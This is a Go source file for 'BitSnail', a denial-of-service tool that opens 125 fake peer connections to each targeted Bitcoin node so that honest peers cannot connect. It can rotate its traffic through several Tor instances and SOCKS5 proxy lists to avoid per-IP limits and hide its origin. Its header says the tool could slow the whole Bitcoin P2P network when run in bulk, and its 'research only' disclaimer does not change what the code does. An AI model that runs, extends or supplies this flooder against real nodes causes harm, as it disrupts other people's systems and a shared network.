/*
BitSnail - an experimental program to exhaust inbound TCP connections of a Bitcoin client. This could possibly slow down the entire Bitcoin P2P network if deployed in bulk.

    .----.   ₿   ₿
   / .-"-.`.  \v/
   | | '\ \ \_/ )
 ,-\ `-.' /.'  /
'---`----'----'

Exhausting inbound connections make the peer inaccessible for others. Essentially, when used against many peers,
this can slow down the Bitcoin network as the P2P network becomes unstable and peers may be unable to connect to each other.

Please note that this DOES NOT EXPLOIT ANY VULNERABILITY. This is typical DoS attempt.
Disclaimer: Use this project only for local testing and security research.

Credits:
For the Bitcoin node handling code (node.go) it uses a fork of https://github.com/agamble/btc-crawler.

License: Unlicense
Date:    7/21/2019
*/

package main

import (
	"fmt"
	"io/ioutil"
	"net"
	_ "net/http/pprof"
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/proxy"
)

// The numberPeerFlood defines how many fake peers shall be created and connect concurrently to the target.
const numberPeerFlood = 125 // DEFAULT_MAX_PEER_CONNECTIONS

// The User Agent is sent in the initial handshake to the target Bitcoin peer.
//const clientUserAgent = "/Satoshi:0.18.0/"
const clientUserAgent = "/BitSnail:0.3.0/"

var proxyEnable = false

const torCount = 5         // Amount of Tor proxy instances to launch
const torBindIP = ""       // Set local IP to bind. Empty for auto-detect by Tor.
const torSocketBase = 9050 // Port to start
const torRestart = 30      // In minutes

var proxyClientBindIP = []string{""} // Force outgoing connections to a SOCKS5 proxy (non-Tor) to bind to the IPs

func main() {
	// get the target from command line or input file
	var targetPeers []net.TCPAddr
	var valid, proxyValidateMode bool
	var torExecutable, proxyListFile string

	switch len(os.Args) {
	case 2:
		targetPeers = ParseBitcoinTarget(os.Args[1], true)

	case 3, 4, 5:
		targetPeers = ParseBitcoinTarget(os.Args[1], true)

		if torExecutable, valid = parseFlagPath("tor", os.Args[2]); !valid {
			return
		}

		proxyEnable = true

		if len(os.Args) >= 4 {
			if proxyListFile, valid = parseFlagPath("proxies", os.Args[3]); !valid {
				return
			}
		}

		if len(os.Args) >= 5 && os.Args[4] == "proxyvalidate" {
			proxyValidateMode = true
		}

	default:
	}

	if len(targetPeers) == 0 {
		fmt.Printf("Invalid arguments. First parameter must be IP:Port or input file and second optional is tor=[executable].\n")
		return
	}

	// parse the proxy input file if available
	parseProxyFile(proxyListFile, proxyValidateMode)
	if proxyValidateMode {
		fmt.Printf("**** Proxy Validation Mode ****\nSave the following output to your proxy input file: %s\n--------\n", proxyListFile)

		for _, proxyI := range proxies {
			fmt.Printf("%s\n", proxyI.address)
		}
		return
	}

	// give Tor processes 10 seconds to span up
	if proxyEnable {
		initTorProxies(torCount, torBindIP, torSocketBase, torExecutable, torRestart)
		fmt.Printf("Wait 10 seconds for %d Tor proxy instances to connect\n", torCount)
		time.Sleep(10 * time.Second)
	}

	// start!
	for _, address := range targetPeers {
		go slowDownBitcoinPeer(address, numberPeerFlood)
	}

	go stats()

	select {}
}

// ParseBitcoinTarget parses a target in the form of IP:Port. Returns nil if invalid input.
func ParseBitcoinTarget(target string, allowFile bool) (tcpAddr []net.TCPAddr) {
	// file?
	if fileExists(target) {
		dat, err := ioutil.ReadFile(target)
		if err == nil {
			fields := strings.Fields(string(dat))
			for _, field := range fields {
				field = strings.TrimSpace(field)
				addr1 := ParseBitcoinTarget(field, false)
				if len(addr1) > 0 {
					tcpAddr = append(tcpAddr, addr1...)
				}
			}
			return
		}
	}

	// otherwise must be IP:Port
	ip, port, valid := validateIPPort(target)
	if !valid {
		return nil
	}

	return []net.TCPAddr{net.TCPAddr{IP: ip, Port: port}}
}

func validateIPPort(input string) (ip net.IP, port int, valid bool) {
	host, portA, err := net.SplitHostPort(input)
	if err != nil {
		return nil, 0, false
	}

	ip = net.ParseIP(host)
	if ip == nil {
		return nil, 0, false
	}
	portN, err := strconv.Atoi(portA)
	if err != nil || portN < 0 || portN > 65535 {
		return nil, 0, false
	}

	return ip, portN, true
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func parseFlagPath(prefix, argument string) (filename string, valid bool) {
	prefix += "="

	if !strings.HasPrefix(argument, prefix) {
		return "", false
	}
	argument = strings.TrimPrefix(argument, prefix)
	argument = strings.TrimPrefix(strings.TrimSuffix(argument, "\""), "\"")

	if !fileExists(argument) {
		fmt.Printf("File '%s' does not exist\n", argument)
		return argument, false
	}

	return argument, true
}

func parseProxyFile(filename string, validateOnly bool) {
	if filename == "" {
		return
	}

	dat, err := ioutil.ReadFile(filename)
	if err != nil {
		return
	}

	fields := strings.Fields(string(dat))

	fmt.Printf("Verifying %d entries in the proxy file!\n", len(fields))
	fmt.Printf("Note: If you have many inactive ones, you may want to first add a parameter 'proxyvalidate' and save the output to the proxy file.\n")

	for _, field := range fields {
		field = strings.TrimSpace(field)

		if _, _, valid := validateIPPort(field); !valid { // silently discard invalid non IP:Port entries
			continue
		}

		var dialer proxy.Dialer
		if len(proxyClientBindIP) > 0 {
			dialer = GetDialerBindLocalIP(proxyClientBindIP)
		} else {
			dialer = proxy.Direct
		}

		// Start in go routine if at least 3 valid proxies (and non-validation mode)
		if validateOnly {
			ProxyAddVerify(field, dialer)
		} else {
			go ProxyAddVerify(field, dialer)
			time.Sleep(time.Millisecond * 100)
		}
	}
}
